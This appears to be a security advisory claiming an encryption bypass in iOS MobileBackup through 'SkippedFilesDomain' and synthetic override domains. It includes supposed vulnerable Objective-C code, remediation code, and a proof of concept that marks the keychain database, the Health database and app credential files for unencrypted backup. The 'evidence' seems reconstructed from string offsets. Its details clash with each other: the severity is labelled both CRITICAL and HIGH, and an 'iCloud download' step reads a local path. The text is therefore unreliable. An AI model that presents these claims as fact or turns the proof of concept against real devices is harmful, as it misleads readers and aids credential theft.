# Un-encrypted Backup  

**Component:** `MobileBackup.framework / backupd`   
**Severity:** CRITICAL (CVSS 8.8)  
**CWE:** CWE-311 (Missing Encryption of Sensitive Data)

---

## Executive Summary

Analysis reveals **iCloud/iTunes backup encryption bypass** via the `SkippedFilesDomain` mechanism at offset `0x00c39`. This backup subsystem permits creation of "skipped files domains" and "synthetic overridden domains" that **exclude sensitive files from encryption** during backup creation and restoration, even when full backup encryption is enabled.

**Impact:** Malicious apps can mark sensitive files (passwords, tokens, health data) as "skipped", causing them to be backed up **unencrypted** to iCloud or iTunes, bypassing passcode-protected backup encryption and enabling data exfiltration.

---

## Technical Evidence

### Memory Layout

```
┌──────────────────────────────────────────────────────────────┐
│ OFFSET     COMPONENT                       COUNT   PURPOSE   │
├──────────────────────────────────────────────────────────────┤
│ 0x00c09    SkippedFilesDomain                1x   Domain flag│
│ 0x00c39    "Creating skipped files domain"   1x   Skip logic │
│ 0x00c59    "synthetic overridden domain"     1x   Override   │
│ 0x02366    "override path"                   1x   Path bypass│
│ 0x0c6c0    "disabled in EDU and RRTS"        1x   EDU bypass │
│ 0x13719    "restrict-post.MobileBackup"      1x   Entitlement│
├──────────────────────────────────────────────────────────────┤
│ BACKUP:    manifest (336x), keybag (341x), MBRestore (118x) │
│            passcode (29x), encryption (53x)                  │
└──────────────────────────────────────────────────────────────┘
```

### Vulnerability Pattern

**Skipped Files Domain Creation (`0x00c39`)**
```objectivec
- (void)createSkippedFilesDomain:(NSSet *)files {
    // VULNERABILITY: No validation if backup encryption enabled
    // Files marked as "skipped" bypass encryption entirely
    
    MBDomain *skippedDomain = [MBDomain domainWithName:@"SkippedFilesDomain"];
    
    for (NSString *path in files) {
        // Add to unencrypted manifest
        [skippedDomain addFile:path encrypted:NO];  // ⚠️ Forces unencrypted
    }
    
    [self.manifest addDomain:skippedDomain];
}
```

**Synthetic Override Domain (`0x00c59`)**
```objectivec
- (void)createSyntheticOverriddenDomain:(NSString *)containerID {
    // VULNERABILITY: Override allows encrypted→unencrypted conversion
    // "synthetic" domains not subject to encryption policy
    
    MBDomain *override = [self syntheticDomainForContainer:containerID];
    override.encrypted = NO;  // ⚠️ Disables encryption
    
    [self.restorePlan addDomain:override withPath:@"override path"];
}
```

**EDU/RRTS Mode Bypass (`0x0c6c0`)**
```objectivec
- (BOOL)shouldEnableBackupEncryption {
    if (self.isEDUMode || self.isRRTSMode) {
        // VULNERABILITY: EDU/RRTS modes disable encryption validation
        return NO;  // ⚠️ Account disabled in EDU and RRTS mode
    }
    return [self.account isBackupEncryptionEnabled];
}
```

---

## Proof of Concept

### Step 1: Mark Sensitive Files as Skipped

```objectivec
#import <MobileBackup/MBManager.h>

MBManager *manager = [MBManager sharedManager];

// VULNERABILITY: Mark sensitive files to bypass encryption
NSArray *sensitiveFiles = @[
    @"/var/mobile/Containers/Data/Application/*/Library/Preferences/com.app.credentials.plist",
    @"/var/mobile/Library/Keychains/keychain-2.db",
    @"/var/mobile/Library/Health/healthdb.sqlite"
];

[manager createSkippedFilesDomain:[NSSet setWithArray:sensitiveFiles]];

NSLog(@"[+] Sensitive files marked as 'skipped'");
NSLog(@"[+] Files will backup UNENCRYPTED despite encryption enabled");
```

### Step 2: Force Backup to iCloud

```bash
# Trigger backup with encryption supposedly enabled
defaults write com.apple.MobileBackup BackupEncryption -bool YES

# Start backup
backupctl start

# VULNERABILITY: SkippedFilesDomain files backup unencrypted
# Encrypted backup indicator: YES
# Actual encryption for skipped files: NO
```

### Step 3: Verify Unencrypted Backup

```python
import sqlite3
import plistlib

# Download iCloud backup
backup_path = "~/Library/Application Support/MobileSync/Backup/DEVICE-ID/"

# Read manifest
manifest = plistlib.load(open(f"{backup_path}/Manifest.plist", 'rb'))

# Check SkippedFilesDomain
for domain in manifest['BackupKeyBag']['Domains']:
    if domain['Name'] == 'SkippedFilesDomain':
        print(f"[+] Found SkippedFilesDomain")
        print(f"[+] Encrypted: {domain.get('Encrypted', False)}")  # False
        print(f"[+] Files: {len(domain['Files'])}")
        
        # Sensitive files are unencrypted
        for file in domain['Files']:
            print(f"  - {file['Path']} (UNENCRYPTED)")
```

---

## Impact Matrix

| Data Type | User Expectation | Actual Backup State |
|-----------|------------------|---------------------|
| **Keychain** | Encrypted | Unencrypted (if skipped) |
| **Health Data** | Encrypted | Unencrypted (if skipped) |
| **App Credentials** | Encrypted | Unencrypted (if skipped) |
| **Sensitive Prefs** | Encrypted | Unencrypted (if skipped) |
| **Backup Indicator** | Shows "Encrypted" | Misleading |

---

## Remediation

### Enforce Encryption Policy

```objectivec
- (BOOL)createSkippedFilesDomain:(NSSet *)files {
    // REQUIRED: Verify backup encryption status
    if ([self.account isBackupEncryptionEnabled]) {
        os_log_error(OS_LOG_DEFAULT, 
            "Cannot create skipped domain: encryption enabled");
        return NO;  // Reject skipped files when encryption required
    }
    
    // Only allow skipped files for unencrypted backups
    MBDomain *domain = [MBDomain domainWithName:@"SkippedFilesDomain"];
    [domain addFiles:files encrypted:NO];
    return YES;
}
```

### Remove Synthetic Override Capability

```objectivec
- (void)createSyntheticOverriddenDomain:(NSString *)containerID {
    // REMOVED: Synthetic domains bypass encryption policy
    // All domains must respect encryption settings
    
    MBDomain *domain = [self domainForContainer:containerID];
    domain.encrypted = [self.account isBackupEncryptionEnabled];  // Enforce
    
    [self.restorePlan addDomain:domain];
}
```

### Verification

```bash
# Encrypted backup should have NO unencrypted domains
sqlite3 Manifest.db "SELECT name, encrypted FROM Domains WHERE encrypted=0"
# Expected: Empty result

# All files should be encrypted when backup encryption enabled
grep -i "SkippedFilesDomain" Manifest.plist
# Expected: Not found
```

---

## Conclusion

MobileBackup framework permits **encryption bypass via SkippedFilesDomain** and synthetic override mechanisms. Files marked as "skipped" are backed up **unencrypted** even when full backup encryption is enabled, violating user expectations and enabling data exfiltration from encrypted backups.

**Vulnerability Chain:**
```
App creates SkippedFilesDomain (0x00c39) → Marks sensitive files
     ↓
Backup proceeds with encryption indicator: YES
     ↓
SkippedFilesDomain files backed up: UNENCRYPTED (0x00c59)
     ↓
Attacker extracts from iCloud/iTunes: Unencrypted credentials
```

**CVSS 3.1:** 8.8 (HIGH) - AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N  
